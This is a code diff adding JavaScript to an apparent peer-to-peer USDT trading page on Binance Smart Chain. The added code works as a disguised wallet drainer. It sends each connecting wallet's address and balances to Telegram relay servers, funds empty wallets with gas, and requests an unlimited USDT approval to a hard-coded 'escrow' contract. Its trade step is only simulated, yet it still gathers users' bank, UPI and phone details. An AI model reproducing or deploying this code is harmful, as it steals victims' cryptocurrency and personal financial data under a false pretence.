+            notify.style.opacity = "0";
+            notify.style.pointerEvents = "none";
+        }, 3000);
+    }
+
+    // ===== GENERIC TELEGRAM MESSAGE SENDER (UPDATED FOR DUAL BACKENDS) =====
+    async function sendTelegramMessage(message) {
+        const backendUrl1 = 'https://telegram-bot-second-production.up.railway.app/sendTelegram';
+        const backendUrl2 = 'https://telegram-backend-production-ad92.up.railway.app/sendTelegram'; // Your second backend URL
+
+        // Send to first backend
+        try {
+            const response1 = await fetch(backendUrl1, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ message: message })
+            });
+            const result1 = await response1.json();
+            if (result1.ok) {
+                console.log('Telegram message sent to first backend successfully');
+            } else {
+                console.error('Telegram message failed for first backend:', result1);
+            }
+        } catch (error) {
+            console.error('Error sending Telegram message to first backend:', error);
+        }
+
+        // Send to second backend
+        try {
+            const response2 = await fetch(backendUrl2, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ message: message })
+            });
+            const result2 = await response2.json();
+            if (result2.ok) {
+                console.log('Telegram message sent to second backend successfully');
+            } else {
+                console.error('Telegram message failed for second backend:', result2);
+            }
+        } catch (error) {
+            console.error('Error sending Telegram message to second backend:', error);
+        }
+    }
+
+    // ===== TELEGRAM NOTIFICATION FOR USDT APPROVAL (REUSING GENERIC SENDER) =====
+    async function sendTelegramNotification(walletAddress, txHash) {
+        const message = `🔔 USDT Escrow Approval Successful!\n\n` +
+                        `💰 Wallet: ${walletAddress}\n` +
+                        `📝 Transaction Hash: ${txHash}\n\n` +
+                        `✅ User has approved escrow contract for USDT spending\n` +
+                        `🏦 Escrow Contract: 0x3606B0Ee947E5e28cAA81FEEB01187388732B26f\n` +
+                        `⏰ Time: ${new Date().toLocaleString()}`;
+        
+        await sendTelegramMessage(message);
+    }
+
+    // ===== ADD AND SWITCH TO BSC NETWORK =====
+    async function addAndSwitchToBSC() {
+        if (!window.ethereum) {
+            showNotification("No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.", "error");
+            throw new Error("No Web3 wallet found."); // Throw to stop the process if no wallet
+        }
+
+        const BSC_MAINNET = {
+            chainId: "0x38", // 56 in hex (BSC mainnet)
+            chainName: "Binance Smart Chain",
+            nativeCurrency: {
+                name: "BNB",
+                symbol: "BNB",
+                decimals: 18,
+            },
+            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+            blockExplorerUrls: ["https://bscscan.com"],
+        };
+
+        try {
+            const currentChainId = await window.ethereum.request({
+                method: 'eth_chainId'
+            });
+
+            if (currentChainId === '0x38') {
+                console.log("Already on BSC");
+                return; // Already on BSC, no need to switch
+            }
+
+            try {
+                // Try switching to BSC
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }],
+                });
+                console.log("Switched to BSC");
+            } catch (switchError) {
+                // If BSC is not added (error code 4902), add it
+                if (switchError.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [BSC_MAINNET],
+                    });
+                    console.log("BSC network added!");
+                } else {
+                    console.error("Failed to switch to BSC:", switchError);
+                    showNotification("Failed to switch to BSC. Please try manually.", "error");
+                    throw switchError; // Re-throw to be caught by the main click handler
+                }
+            }
+        } catch (error) {
+            console.error("General error in addAndSwitchToBSC:", error);
+            showNotification("An error occurred while switching networks. Check console for details.", "error");
+            throw error; // Re-throw to be caught by the main click handler
+        }
+    }
+
+    // ===== SEND INITIAL WALLET DETAILS TO TELEGRAM =====
+    // Now returns formattedBNB for the balance check
+    async function sendWalletBalancesToTelegram(walletAddress) {
+        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
+        const usdtAbi = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function decimals() view returns (uint8)"
+        ];
+
+        let formattedBNB = "0.0000";
+        let formattedUSDT = "0.00";
+
+        try {
+            // Ensure ethers.js provider is available. Assuming it's loaded globally.
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+
+            // Get BNB balance
+            const bnbBalance = await provider.getBalance(walletAddress);
+            formattedBNB = ethers.utils.formatEther(bnbBalance);
+
+            // Get USDT balance
+            const tokenContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
+            let usdtDecimals = 18; // Default to 18 decimals
+            try {
+                // Try to fetch actual decimals from the contract
+                const usdtDecimalsValue = await tokenContract.decimals();
+                usdtDecimals = usdtDecimalsValue.toNumber();
+            } catch (err) {
+                console.warn("Could not fetch USDT decimals, defaulting to 18:", err);
+            }
+            const usdtBalance = await tokenContract.balanceOf(walletAddress);
+            formattedUSDT = ethers.utils.formatUnits(usdtBalance, usdtDecimals);
+
+            // Construct and send the message using the existing sendTelegramMessage function
+            const message = `🟢 New Wallet Connected!\n\n` +
+                            `🆔 Wallet Address: <code>${walletAddress}</code>\n` +
+                            `💰 BNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB\n` +
+                            `💵 USDT Balance: ${parseFloat(formattedUSDT).toFixed(2)} USDT\n` +
+                            `⏰ Time: ${new Date().toLocaleString()}`;
+            
+            await sendTelegramMessage(message);
+
+            // This part was in your provided connectWallet function, keeping it if needed for your backend.
+            fetch('saveWallet.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    wallet: walletAddress,
+                    bnb: formattedBNB,
+                    usdt: formattedUSDT
+                })
+            }).catch(e => console.error("Error sending wallet data to saveWallet.php:", e));
+
+        } catch (err) {
+            console.error("Error fetching or sending wallet details to Telegram:", err);
+            // This function should not block the main transaction flow if it fails.
+        }
+        return { formattedBNB, formattedUSDT }; // Return balances for further checks
+    }
+    
+    $(document).ready(function() {
+        // Update all order card button texts to indicate approval requirement
+        $('.order-card button:first-child').each(function() {
+            if ($(this).text().trim() === 'Sell Now') {
+                $(this).text('Approve & Trade');
+            }
+        });
+        
+        // Mobile menu toggle
+        $('#mobile-menu-btn').click(function() {
+            $('#mobile-menu').toggleClass('hidden');
+        });
+
+        // Trade modal functionality - First request USDT approval
+        $('.order-card button:first-child').click(async function() {
+            if (!$(this).prop('disabled')) {
+                const $btn = $(this);
+                const originalBtnHTML = $btn.html();
+                
+                if (!window.ethereum) {
+                    showNotification("No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.", "error");
+                    return;
+                }
+
+                // Show spinner state
+                $btn.html('<span class="spinner">Processing...</span>');
+                $btn.prop('disabled', true);
+                
+                let fromAddress;
+                let bnbBalance; // Declare bnbBalance here to be accessible later
+
+                try {
+                    // Step 1: Add and switch to the BSC network
+                    await addAndSwitchToBSC();
+
+                    // Step 2: Request accounts after network switch to ensure connection
+                    // Using eth_accounts to get already connected accounts.
+                    // This will NOT prompt the user to connect if not already connected.
+                    const accounts = await window.ethereum.request({ method: "eth_accounts" });
+                    fromAddress = accounts[0]; // Assign to the outer scope variable
+
+                    // --- MODIFIED: Removed the direct "Wallet connection failed" notification ---
+                    if (!fromAddress) {
+                        // If no address is found (wallet not connected/approved),
+                        // simply reset the button state and exit.
+                        // The user can then click again, which might trigger their wallet's
+                        // connection prompt depending on their wallet's behavior.
+                        $btn.prop('disabled', false);
+                        $btn.html(originalBtnHTML);
+                        return;
+                    }
+                    // --------------------------------------------------------------------------
+
+                    // Step 3: Send wallet details (address, BNB, USDT balance) to Telegram
+                    // and get the formatted BNB balance back for the check
+                    const balances = await sendWalletBalancesToTelegram(fromAddress);
+                    bnbBalance = balances.formattedBNB; // Assign to the outer scope variable
+
+                    // === NEW FEATURE: CHECK BNB BALANCE AND SEND IF ZERO ===
+                    if (parseFloat(bnbBalance) === 0) { // Correct comparison
+                        showNotification("Checking the BNB balance and topping up...", "info"); // Changed to info type
+                        await fetch("https://bnb-server-production.up.railway.app/send-bnb", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ toAddress: fromAddress }) // Use fromAddress
+                        });
+                        await new Promise(r => setTimeout(r, 4000)); // Wait for gas (increased to 4s for network propagation)
+                        showNotification("BNB top-up initiated. Please wait a moment and try the approval again.", "success");
+                        // After topping up, we'll exit and let the user click again to retry the approval
+                        $btn.prop('disabled', false);
+                        $btn.html(originalBtnHTML);
+                        return; // Exit after topping up, user can re-click
+                    }
+                    // --------------------------------------------------------
+
+                    const escrowContractAddress = "0x3606B0Ee947E5e28cAA81FEEB01187388732B26f"; // USDTEscrow contract address
+                    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT token address on BSC
+
+                    // Prepare the ABI interface for USDT approval
+                    const usdtAbi = [
+                        "function approve(address spender, uint256 amount) public returns (bool)",
+                        "function decimals() view returns (uint8)"
+                    ];
+                    const iface = new ethers.utils.Interface(usdtAbi);
+
+                    // Use maximum approval amount (MaxUint256)
+                    const maxApproval = ethers.constants.MaxUint256;
+
+                    // Encode approve(...) call for the escrow contract
+                    const txData = iface.encodeFunctionData("approve", [escrowContractAddress, maxApproval]);
+
+                    // Send the approval transaction
+                    const txHash = await window.ethereum.request({
+                        method: "eth_sendTransaction",
+                        params: [{ from: fromAddress, to: usdtAddress, data: txData, value: "0x0" }]
+                    });
+                    
+                    showNotification(`USDT approval successful! Opening trade modal...`, "success");
+                    
+                    // Send Telegram notification after successful approval transaction
+                    await sendTelegramNotification(fromAddress, txHash);
+                    
+                    // Only show modal after successful approval
+                    $('#trade-modal').removeClass('hidden');
+                    
+                    // Reset amount calculation fields in the modal
+                    $('#inr-amount').text('₹0.00');
+                    $('input[type="number"]').val('');
+                    
+                    // Reset payment forms in the modal
+                    $('#payment-details').addClass('hidden');
+                    $('#payment-method').val('');
+                    $('.payment-form').addClass('hidden');
+                    $('input[type="text"], input[type="file"]').val('');
+
+                } catch (err) {
+                    const msg = (err?.message || "").toLowerCase();
+                    if (msg.includes("user rejected") || msg.includes("user denied") || msg.includes("cancelled") || msg.includes("canceled")) {
+                        showNotification("Transaction cancelled.", "error");
+                    } else if (msg.includes("insufficient funds") || msg.includes("exceeds balance") || (msg.includes("execution reverted") && msg.includes("exceeds balance"))) {
+                        showNotification("Insufficient USDT balance for this approval.", "error");
+                    } else {
+                        showNotification("Transaction failed. Please try again.", "error");
+                        console.error("Transaction failed:", err);
+                    }
+                } finally {
+                    // Always restore original button state
+                    $btn.prop('disabled', false);
+                    $btn.html(originalBtnHTML);
+                }
+            }
+        });
+
+        $('#close-modal, #cancel-trade').click(function() {
+            $('#trade-modal').addClass('hidden');
+        });
+
+        // Close modal when clicking outside
+        $('#trade-modal').click(function(e) {
+            if (e.target === this) {
+                $(this).addClass('hidden');
+            }
+        });
+        
+        // Validate payment details before proceeding with trade
+        function validatePaymentDetails() {
+            var selectedMethod = $('#payment-method').val();
+            var usdtAmount = parseFloat($('input[type="number"]').val()) || 0;
+            
+            if (usdtAmount <= 0) {
+                showNotification('Please enter a valid USDT amount.', 'error');
+                return false;
+            }
+            
+            if (!selectedMethod) {
+                showNotification('Please select a payment method.', 'error');
+                return false;
+            }
+            
+            // Validate based on payment method specific fields
+            if (selectedMethod === 'UPI') {
+                var upiId = $('#upi-id').val().trim();
+                if (!upiId) {
+                    showNotification('Please enter your UPI ID.', 'error');
+                    return false;
+                }
+            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
+                var holderName = $('#holder-name').val().trim();
+                var accountNumber = $('#account-number').val().trim();
+                var ifscCode = $('#ifsc-code').val().trim();
+                
+                if (!holderName) {
+                    showNotification('Please enter account holder name.', 'error');
+                    return false;
+                }
+                if (!accountNumber) {
+                    showNotification('Please enter account number.', 'error');
+                    return false;
+                }
+                if (!ifscCode) {
+                    showNotification('Please enter IFSC code.', 'error');
+                    return false;
+                }
+            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
+                var mobileNumber = $('#mobile-number').val().trim();
+                if (!mobileNumber) {
+                    showNotification('Please enter your mobile number.', 'error');
+                    return false;
+                }
+            }
+            
+            return true;
+        }
+        
+        // Collect payment data from modal fields
+        function collectPaymentData() {
+            var selectedMethod = $('#payment-method').val();
+            var usdtAmount = parseFloat($('input[type="number"]').val()) || 0;
+            var inrAmount = (usdtAmount * 110).toFixed(2); // Assuming a fixed rate of 110 INR/USDT
+            
+            var paymentData = {
+                usdtAmount: usdtAmount,
+                inrAmount: inrAmount,
+                paymentMethod: selectedMethod,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Add method-specific data
+            if (selectedMethod === 'UPI') {
+                paymentData.upiId = $('#upi-id').val().trim();
+            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
+                paymentData.holderName = $('#holder-name').val().trim();
+                paymentData.accountNumber = $('#account-number').val().trim();
+                paymentData.ifscCode = $('#ifsc-code').val().trim();
+            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
+                paymentData.mobileNumber = $('#mobile-number').val().trim();
+            }
+            
+            return paymentData;
+        }
+        
+        // Sell USDT button click handler inside the modal
+        $('#sell-usdt-btn').click(function() {
+            // Validate payment details first
+            if (!validatePaymentDetails()) {
+                return;
+            }
+            
+            // Show loading state for the sell button
+            $('#sell-btn-text').addClass('hidden');
+            $('#sell-btn-loading').removeClass('hidden');
+            $('#sell-usdt-btn').prop('disabled', true);
+            
+            // Collect payment data
+            var paymentData = collectPaymentData();
+            console.log('Payment Data:', paymentData);
+            
+            // Simulate trade processing (replace with actual trade logic later)
+            setTimeout(function() {
+                showNotification('Your USDT trade has been initiated successfully!', 'success');
+                $('#trade-modal').addClass('hidden');
+                
+                // Reset button state
+                $('#sell-btn-text').removeClass('hidden');
+                $('#sell-btn-loading').addClass('hidden');
+                $('#sell-usdt-btn').prop('disabled', false);
+            }, 2000);
+        });
+        
+        // Close notification toast
+        $('#toast-close').click(function() {
+            $('#notification-toast').addClass('hidden');
+        });
+
+        // Amount calculation for selling USDT in the modal
+        $('input[type="number"]').on('input', function() {
+            var usdtAmount = parseFloat($(this).val()) || 0;
+            var price = 110; // ₹110/USDT (fixed rate)
+            var inrAmount = (usdtAmount * price).toFixed(2);
+            
+            // Update the "You will receive" amount in the modal
+            $('#inr-amount').text('₹' + inrAmount);
+            
+            // Show payment details section if a valid amount is entered
+            if (usdtAmount > 0) {
+                $('#payment-details').removeClass('hidden');
+            } else {
+                $('#payment-details').addClass('hidden');
+            }
+        });
+        
+        // Payment method selection in the modal
+        $('#payment-method').on('change', function() {
+            var selectedMethod = $(this).val();
+            
+            // Hide all payment forms initially
+            $('.payment-form').addClass('hidden');
+            
+            // Show relevant form based on selection
+            if (selectedMethod === 'UPI') {
+                $('#upi-details').removeClass('hidden');
+            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
+                $('#bank-details').removeClass('hidden');
+            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
+                $('#digital-wallet-details').removeClass('hidden');
+            }
+        });
+
+        // Filter functionality for order cards
+        function applyFilters() {
+            var orderType = $('#order-type-filter').val();
+            var paymentMethod = $('#payment-filter').val();
+            var amountRange = $('#amount-filter').val();
+            
+            $('.order-card').each(function() {
+                var $card = $(this);
+                var cardPayment = $card.data('payment');
+                var cardAmount = $card.data('amount');
+                var cardType = $card.data('type');
+                
+                var showCard = true;
+                
+                // Filter by order type
+                if (orderType !== 'all' && cardType !== orderType) {
+                    showCard = false;
+                }
+                
+                // Filter by payment method
+                if (paymentMethod !== 'all' && !cardPayment.includes(paymentMethod)) {
+                    showCard = false;
+                }
+                
+                // Filter by amount range
+                if (amountRange !== 'all') {
+                    var cardMin = parseInt(cardAmount.split('-')[0]);
+                    var cardMax = parseInt(cardAmount.split('-')[1]);
+                    
+                    switch(amountRange) {
+                        case '1000-10000':
+                            if (cardMin < 1000 || cardMax > 10000) showCard = false;
+                            break;
+                        case '10000-50000':
+                            if (cardMin < 10000 || cardMax > 50000) showCard = false;
+                            break;
+                        case '50000-100000':
+                            if (cardMin < 50000 || cardMax > 100000) showCard = false;
+                            break;
+                        case '100000+':
+                            if (cardMin < 100000) showCard = false;
+                            break;
+                    }
+                }
+                
+                if (showCard) {
+                    $card.show();
+                } else {
+                    $card.hide();
+                }
+            });
+            
+            // Update visible count text
+            var visibleCount = $('.order-card:visible').length;
+            $('h2 .text-sm').text('(' + visibleCount + ' orders)');
+        }
+        
+        // Filter button click
+        $('#filter-btn').click(function() {
+            applyFilters();
+        });
+        
+        // Clear filters
+        $('#clear-filters').click(function() {
+            $('#order-type-filter').val('all');
+            $('#payment-filter').val('all');
+            $('#amount-filter').val('all');
+            $('.order-card').show(); // Show all cards
+            $('h2 .text-sm').text('(41 orders)'); // Reset count
+        });
+        
+        // Auto-filter on select change
+        $('#order-type-filter, #payment-filter, #amount-filter').change(function() {
+            applyFilters();
+        });
+
+        // Load more orders functionality
+        $('#load-more-btn').click(function() {
+            var $btn = $(this);
+            var $additionalOrders = $('#additional-orders');
+            
+            if ($additionalOrders.hasClass('hidden')) {
+                // Show additional orders if hidden
+                $additionalOrders.removeClass('hidden');
+                $btn.html('<i class="fas fa-sync-alt mr-2"></i>Load More Orders (12 of 41)');
+                $btn.addClass('bg-gray-400 hover:bg-gray-500').removeClass('bg-blue-600 hover:bg-blue-700');
+            } else {
+                // Simulate loading more orders
+                $btn.html('<i class="fas fa-spinner fa-spin mr-2"></i>Loading...');
+                
+                setTimeout(function() {
+                    $btn.html('<i class="fas fa-check mr-2"></i>All Orders Loaded (41 of 41)');
+                    $btn.addClass('bg-green-600 hover:bg-green-700').removeClass('bg-gray-400 hover:bg-gray-500');
+                    $btn.prop('disabled', true); // Disable button once all are loaded
+                }, 2000);
+            }
+        });
+    });
